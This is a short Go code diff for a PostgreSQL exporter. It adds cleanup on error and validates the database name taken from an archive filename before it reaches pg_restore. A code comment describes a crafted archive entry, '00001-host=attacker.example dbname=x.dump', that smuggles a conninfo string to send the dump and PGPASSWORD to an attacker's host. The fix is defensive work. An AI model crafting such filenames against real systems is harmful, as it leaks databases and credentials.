@@ -127,7 +127,12 @@ func NewExporter(ctx context.Context, opts *connectors.Options, name string, con
 	if err != nil {
 		return nil, err
 	}
-	return NewExporterFromConfigMap(conn, dbPath, "postgresql", config)
+	exp, err := NewExporterFromConfigMap(conn, dbPath, "postgresql", config)
+	if err != nil {
+		conn.Cleanup()
+		return nil, err
+	}
+	return exp, nil
 }
 
 func (p *Exporter) Root() string          { return "/" }
@@ -266,6 +271,14 @@ func (p *Exporter) pgRestore(ctx context.Context, r io.Reader, pathname string) 
 	targetDB := p.database
 	if targetDB == "" {
 		targetDB = dumpBaseName(pathname)
+	}
+
+	// The filename comes from the archive, and pg_restore's -d takes a full
+	// conninfo string when the value contains "=", so an entry named
+	// "00001-host=attacker.example dbname=x.dump" would send the dump and
+	// PGPASSWORD to whatever host it names.
+	if err := pgconn.ValidDatabaseName(targetDB); err != nil {
+		return fmt.Errorf("restoring %q: %w", pathname, err)
 	}
 
 	args := p.conn.Args()
